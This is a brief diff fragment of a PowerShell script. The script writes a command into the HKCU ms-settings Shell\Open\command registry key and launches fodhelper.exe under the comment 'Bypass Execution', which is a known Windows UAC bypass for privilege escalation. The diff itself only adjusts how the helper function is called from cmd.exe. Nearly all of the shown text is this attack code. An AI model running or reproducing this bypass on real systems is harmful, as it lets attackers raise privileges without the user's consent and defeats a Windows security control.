@@ -16,4 +16,4 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
 #Bypass Execution
 Start-Process "C:\Windows\System32\fodhelper.exe"
 }
-"cmd.exe /c powershell helper";
+cmd.exe /c powershell 'helper'
